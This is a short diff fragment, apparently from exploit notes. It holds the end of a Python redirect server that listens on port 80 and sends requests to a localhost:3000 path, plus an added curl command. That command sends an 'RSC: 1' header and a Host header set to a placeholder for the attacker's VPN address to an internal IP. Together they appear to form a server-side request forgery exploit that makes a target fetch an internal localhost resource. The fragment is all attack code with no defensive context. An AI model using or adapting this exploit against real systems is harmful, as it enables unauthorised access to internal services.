@@ -6,3 +6,4 @@ class R(BaseHTTPRequestHandler):
         self.send_header('Location', 'http://localhost:3000/3WpzTMYEK9QG0eqIBQxrR')
         self.end_headers()
 HTTPServer(('0.0.0.0', 80), R).serve_forever()"
+curl -v -L -H "RSC: 1" -H "Host: ТВОЙ_IP_VPN" http://10.81.150.158:3000/cgi-bin/
